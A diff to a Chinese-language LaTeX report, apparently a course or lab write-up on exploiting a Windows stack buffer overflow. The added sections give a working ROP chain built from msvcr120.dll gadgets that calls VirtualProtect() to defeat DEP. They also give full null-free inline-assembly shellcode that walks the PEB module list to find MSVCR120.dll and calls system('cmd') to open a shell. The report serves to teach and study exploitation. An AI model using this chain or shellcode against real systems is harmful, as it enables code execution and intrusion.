@@ -147,9 +147,170 @@ LABEL_BASE:
 
 ``call -1''后LABEL\_BASE的地址被压栈, 然后eip指向标号4, 将标号4和5的``FFC2''译码成``inc edx''; 然后执行标号6的``pop ecx''(0x59), 将保存在栈顶的LABEL\_BASE的地址pop进ecx; 之后执行标号7的``nop''(0x90). 至此实现了自定位——LABEL\_BASE的地址被保存在ecx。
 
-\section{突破数据执行保护(DEP}
+\section{突破数据执行保护(DEP)}
+突破DEP的方法是使用ROP链构造VirtualProtect()函数调用，将shellcode所在的栈内存设置为可执行。构造ROP链的方式可以使用WinDbg+mona，但是该方法只适用于32位系统，所以gadgets的搜索只能自己编写程序完成。\href{https://www.anquanke.com/post/id/168276}{https://www.anquanke.com/post/id/168276}给出了mona提供的一段ROP链，实际使用时为了简便，我对该ROP链进行了一些修改，修改如下：
+
+\begin{lstlisting}[language=C++, basicstyle=\ttfamily\tiny, numbers=left, numberstyle=\tiny, keywordstyle=\color{blue!70}, commentstyle=\color{red!50!green!50!blue!50}, frame=shadowbox, rulesepcolor=\color{red!20!green!20!blue!20}]
+	0x5a58ed02, // # pop ebp # ret [msvcr120.dll]
+	0x5a58ed02, // # skip 4 bytes [msvcr120.dll]
+	0x5a582308, // # pop ebx # ret [msvcr120.dll]
+	0x00000201, // 0x00000201 -> ebx [msvcr120.dll]
+	0x5a58e734, // # pop edx # ret [msvcr120.dll]
+	0x00000040, // 0x00000040 -> edx [msvcr120.dll]
+	0x5a58ec8c, // # pop ecx # ret [msvcr120.dll]
+	0x5a65e000, // &writable location [msvcr120.dll]
+	0x5a58f0f3, // # pop edi # ret [msvcr120.dll]
+	0x5a58139b, // # ret [msvcr120.dll]
+	0x5a58f74a, // # pop esi # ret [msvcr120.dll]
+	0x5a58efd7, // # jmp eax [msvcr120.dll]
+	0x5a58469c, // # pop eax # ret [msvcr120.dll]
+	0x76b743ce, // entry of VirtualProtect() [kernel32.dll]
+	0x5a5846a0, // # pushad # ret [msvcr120.dll]
+	0x5a5bac78  // # push esp # ret [msvcr120.dll]
+\end{lstlisting}
+
+这段ROP链直接跳转到VirtualProtect()的入口，而不是借助mvscr120.dll的IAT。
+
+VirtualProtect()函数原型如下：
+
+\begin{lstlisting}[language=C++, basicstyle=\ttfamily\tiny, numbers=left, numberstyle=\tiny, keywordstyle=\color{blue!70}, commentstyle=\color{red!50!green!50!blue!50}, frame=shadowbox, rulesepcolor=\color{red!20!green!20!blue!20}]
+CODE_ENTRY:
+BOOL VirtualProtect(
+	LPVOID pAddress,
+	SIZE_T dwSize,
+	DWORD  NewProtect,
+	PDWORD pOldProtect
+);
+\end{lstlisting}
+
+\begin{figure}[htbp]
+	\centering\includegraphics[height=5cm]{images/stack1.png}
+	\caption{调用VirtualProtect()时栈的内存布局}
+	\label{fig:stack1}
+\end{figure}
+
+根据C调用约定，当跳转过去执行VirtualProtect()时栈的内存布局如图\ref{fig:stack1}所示。ROP链的工作就是将相关参数压栈，然后跳转到VirtualProtect()。上面那段ROP链调用VirtualProtect()所使用的参数为：
+
+\begin{itemize}
+	\item pAddress = ROP链的最后一个地址（所以需要将shellcode附加到ROP链末尾，这样shellcode就位于VirtualProtect()的影响范围之内）
+	\item dwSize = 0x201
+	\item NewProtect = PAGE\_EXECUTE\_READWRITE(0x40)
+	\item pOldProtect = mvscr120.dll内存映像内的一个可写地址，这可以是.data段内的任意一个地址
+\end{itemize}
+
+将上述ROP链和之前构造的shellcode拼接在一起进行栈溢出，就可以突破DEP获得shellcode的执行权，具体的工作流程将在下一章``测试及分析''中详细讨论。
 
 \chapter{测试及分析}
+\section{栈内存布局}
+栈上的缓冲区被溢出后，内存布局如图\ref{fig:stack2}所示。返回地址被覆盖成ROP链的第一个DWORD，然后RET指令就将EIP指向ROP链的第一个gadget。ROP链上的gadgets执行结束后程序流将被转移到shellcode。
+
+\begin{figure}[htbp]
+	\centering\includegraphics[height=6cm]{images/stack2.png}
+	\caption{栈上的缓冲区被溢出后的内存布局}
+	\label{fig:stack2}
+\end{figure}
+
+\section{shellcode}
+
+\begin{lstlisting}[language=C++, basicstyle=\ttfamily\tiny, numbers=left, numberstyle=\tiny, keywordstyle=\color{blue!70}, commentstyle=\color{red!50!green!50!blue!50}, frame=shadowbox, rulesepcolor=\color{red!20!green!20!blue!20}]
+__asm
+{
+/*********************************************************/
+/*                    CODE_ENTRY                         */
+/*********************************************************/
+CODE_ENTRY:
+/* 0 */	_EMIT 0xE8;
+/* 1 */	_EMIT 0xFF;
+/* 2 */	_EMIT 0xFF;
+/* 3 */	_EMIT 0xFF;
+/* 4 */	_EMIT 0xFF; // call 0xFFFFFFFF
+LABEL_BASE:
+/* 5 */	_EMIT 0xC2;
+/* 6 */	_EMIT 0x59;
+/* 7 */	_EMIT 0x90;
+// "call -1"后LABEL_BASE的地址被压栈, 然后eip指向标号4, 将标号4和5的"FFC2"译码成"inc edx";
+// 然后执行标号6的"pop ecx"(59), 将保存在栈顶的LABEL_BASE的地址pop进ecx; 之后执行标号7的"nop"(90).
+// 至此实现了自定位——LABEL_BASE的地址被保存在ecx
+_GetLibcBaseAddress:
+	xor ebx, ebx;
+	mov eax, fs:[ebx + 0x30]; // linear address of PEB (直接"mov eax,fs:[0x30]"会使代码中出现0x00)
+	mov eax, [eax + 0xc]; // 从PEB结构体偏移0xc处取得PEB_LDR_DATA结构体的地址
+	mov ebx, [eax + 0xc]; // ebx <- 第一个LDR_MODULE的地址
+	mov edx, ebx; // edx保存循环链表的头地址
+SEARCH_MODULE_LOOP:
+	mov eax, ebx;
+	add eax, 0x2C + 0x4; // LDR_MODULE偏移0x2C处是BaseDllName, 一个UNICODE_STRING, 其中偏移0x4处是一个指向UNICODE字符串的指针
+	mov esi, [eax];
+	mov edi, LIBC_NAME;
+	sub edi, LABEL_BASE; // 这两个label的地址中不能出现0x00, 如果有就重新编译知道满足要求
+	add edi, ecx;
+/*********************************************************/
+/*        bool _strcmp(wchar *s1, char *s2)              */
+/*        - args: esi = s1, edi = s2(end with '$')       */
+/*        - ret: al=1 if equal, al=0 if NOT equal        */
+/*********************************************************/
+// 这里本可以写成"call _strcmp", 但是这样会在代码中出现0x00, 所以直接将函数嵌入进来
+_strcmp:
+	push ebx;
+LOOP_CMP_STRCMP:
+	mov al, [esi];
+	mov bl, [edi];
+	cmp al, bl;
+	je CONTINUE_STRCMP;
+	test al, al;
+	jnz NOT_EQUAL_STRCMP;
+	cmp bl, '$'; // 两个字符串同时结束时al=0,bl='$'
+	jne NOT_EQUAL_STRCMP;
+	xor al, al;
+	inc al; // equal (这两条指令用于替代"mov al,1")
+	jmp END_STRCMP;
+CONTINUE_STRCMP:
+	inc esi;
+	inc esi; // 两个"inc esi"一共2字节,一个"add esi,2"却需要3字节
+	inc edi;
+	jmp LOOP_CMP_STRCMP;
+NOT_EQUAL_STRCMP:
+	xor al, al; // not equal
+END_STRCMP:
+	pop ebx;
+/******************** end of _strcmp ********************/
+	cmp al, 1; // al==1 equal; al==0 not equal
+	je MODULE_FOUND;
+	mov ebx, [ebx];
+	cmp ebx, edx;
+	je MODULE_NOT_FOUND; // 循环链表已经遍历完了
+	jmp SEARCH_MODULE_LOOP;
+MODULE_FOUND:
+	mov eax, [ebx + 0x18]; // LDR_MODULE偏移0x18处是模块的线性基地址BaseAddress
+_GetSystemFuncEntry:
+	mov ebx, eax;
+	sub ebx, 0xfff9dec7;
+	sub eax, 0xfff7f73e; // 用sub替换add, 使得代码中没有0x00. 加上一个数 <=> 减去这个数的相反数
+	//add ebx, 0x62139; // 0x62139是msvcr120.dll中字符串"cmd"的RVA
+	//add eax, 0x808c2; // 0x808c2是msvcr120.dll的export address table中记录的system函数的入口RVA
+	push ebx;
+	call eax; // 获得shell之后就结束了, 不必关注调用结束后的事情
+MODULE_NOT_FOUND:
+	jmp MODULE_NOT_FOUND; // endless loop
+/*********************************************************/
+/*                      Data                             */
+/*********************************************************/
+LIBC_NAME:
+	_EMIT 'M';
+	_EMIT 'S';
+	_EMIT 'V';
+	_EMIT 'C';
+	_EMIT 'R';
+	_EMIT '1';
+	_EMIT '2';
+	_EMIT '0';
+	_EMIT '.';
+	_EMIT 'd';
+	_EMIT 'l';
+	_EMIT 'l';
+	_EMIT '$'; // '$'作为结束符, 因为shellcode中不能出现0x00
+}
+\end{lstlisting}
 
 \chapter{总结及展望}
 
